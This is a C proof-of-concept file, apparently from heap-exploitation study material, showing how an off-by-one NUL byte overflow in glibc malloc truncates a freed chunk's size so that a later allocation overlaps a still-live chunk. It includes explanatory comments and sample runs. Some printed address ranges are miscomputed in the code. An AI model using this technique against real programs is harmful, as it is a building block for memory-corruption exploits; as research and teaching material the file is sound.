/*

AUTHOR: Taviso PoC + degrigis fix and comments

http://www.contextis.com/documents/120/Glibc_Adventures-The_Forgotten_Chunks.pdf

NOTES: 

This technique attacks the updating of 
the prev_size value.

When we are allocating into the chunk p2,
the remaining size is calculated as 
current_chunk_size - allocated_size, but since 
current_chunk_size has been faked, we will put the final
result in a wrong location by using the current chunk pointer +
the fake_current_chunk_size. This should update the prev_size
of the next chunk, but in reality it doesn't do that! 


RUN WITHOUT THE BUG:
----------------------------------------------------
p has been allocated here 08aa2008 - 08aa2400
p2 has been allocated here 08aa2408 - 08aa2410
p3 has been allocated here 08aa2818 - 08aa2400
p2 has been freed

Simulating the vulnerability that overwrite p2 size!
p2_1 has been allocated here 08aa2408 - 08aa2600
p2_2 has been allocated here 08aa2608 - 08aa2700
p2_1 has been freed
p3 has been freed
new p2 has been allocated here 08aa2708 - 08aa2f08 [ p2 do not overlap with p2_2! ]
----------------------------------------------------


RUN WITH THE BUG:
----------------------------------------------------
p has been allocated here 09405008 - 09405400
p2 has been allocated here 09405408 - 09405410
p3 has been allocated here 09405818 - 09405400
p2 has been freed

Simulating the vulnerability that overwrite p2 size!
p2_1 has been allocated here 09405408 - 09405600
p2_2 has been allocated here 09405608 - 09405700
p2_1 has been freed
p3 has been freed
new p2 has been allocated here 09405408 - 09405c08  [ p2 overlap with p2_2! ]
----------------------------------------------------

*/


#include <stdlib.h>
#include <string.h>

#define BUG 1

int main(int argc, const char* argv[])
{
  // Allocate three large contiguous chunks.
  char* p = malloc(1024 - 8);
  // Make sure the chunk size (including metadata) is not 1024 exactly. If it
  // were 1024 exactly, setting the LSB to 0 would not affect the size.
  char* p2 = malloc(1024 + 16 - 8);
  char* p3 = malloc(1024 - 8);

  printf("p has been allocated here %08x - %08x\n" , p,p+1024-8);
  printf("p2 has been allocated here %08x - %08x\n" , p2,p+1024+16-8);
  printf("p3 has been allocated here %08x - %08x\n" , p3,p+1024-8);

  char* p2_1;
  char* p2_2;
  // Set them up with easily recognizable values.
  memset(p, 'A', 1024 - 8);
  memset(p2, 'B', 1024 + 16 - 8);
  memset(p3, 'C', 1024 - 8);
  // Free the second chunk.
  // This writes the "prev_size" size of the freed chunk, at the end of the
  // free()'d p2 buffer / the beginning of the in-use p3 buffer.

  printf("p2 has been freed\n");

  free(p2);

  // Overflow the first chunk, off-by-one, with a NUL byte.
  // This truncates the size of the free chunk.

  printf("\nSimulating the vulnerability that overwrite p2 size!\n");

#ifdef BUG
  p[1024-4] = 0x00;
#endif

  // Allocate a subsection of the free'd second chunk. Since the free chunk we
  // are allocating out of has a truncated size, we end up miscalculting the
  // remaining space, and writing the "prev_size" value of the remaining space
  // at a slightly off location, before where it should be. This leaves the
  // old "prev_size" at the end of p2 / beginning p3.

  p2_1 = malloc(512 - 8);
  printf("p2_1 has been allocated here %08x - %08x\n" , p2_1, p2_1+512-8);

  memset(p2_1, 'F', 512 - 8);
  // Allocate another subsection of the free'd second chunk.
  p2_2 = malloc(256 - 8);
  printf("p2_2 has been allocated here %08x - %08x\n" , p2_2, p2_2+256-8);

  memset(p2_2, 'D', 256 - 8);
  // Free the first re-allocated subsection of the free'd second chunk.
  free(p2_1);
  printf("p2_1 has been freed\n");
  // Free the third chunk.
  // We will see that the old, incorrect "prev_size" value and end up treating
  // p2 as a free'd chunk, and coalescing it, even though we have handed out
  // a still-live pointer half-way through. 
  free(p3);
  printf("p3 has been freed\n");

  p2 = malloc(2048);
  printf("new p2 has been allocated here %08x - %08x\n\n" , p2, p2+2048);

  // the new p2 should now overlap with the p2_2 chunk! 
}
